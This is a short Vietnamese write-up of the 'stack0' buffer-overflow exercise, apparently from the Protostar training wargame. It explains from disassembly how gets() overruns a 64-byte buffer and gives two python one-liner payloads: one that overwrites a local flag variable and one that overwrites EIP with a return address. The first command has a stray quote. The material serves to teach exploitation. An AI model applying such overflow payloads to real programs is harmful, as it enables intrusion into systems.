# Stack0

Đầu tiên ta chạy thử chương trình, chương trình yêu cầu nhập input. 

![run](run.png)

`try again?`
Vậy cùng xem thử qua hàm main.

![main](disass.png)

t thấy chương trình dùng gets để nhập input vào `[esp+0x1c]`. Sau đó so sánh `[esp+0x5c]` với 0, nếu = 0 in ra `0x8048529 (try again?)` nếu ko thì in ra `0x8048500(you have changed the 'modified' variable)`. Vì ban đầu `[esp+0x5c]` được gán giá trị = 0 nên mục đích của chall này là thay đổi giá trị cua `[esp+0x5c]` để in ra *you have changed the 'modified' variable*. Ta tính được size của `[esp+0x1c]` 0x5c - 0x1c = 64 byte. vậy cần nhập một chuỗi > 64 byte để ghi đè giá trị của `[esp+0x5c]`.

## Solution

### Buffer Overflow

`python -c 'print "a"*65 | ./stack0`

### Ret2ret

Ta có thể overflow sang EIP để jump về `0x08048419`.
padding = esp + ebp = 0x60 + 4 = 0x64
payload: `python -c 'print "a"*100 + "\x19\x84\x04\x08"' | ./stack0`
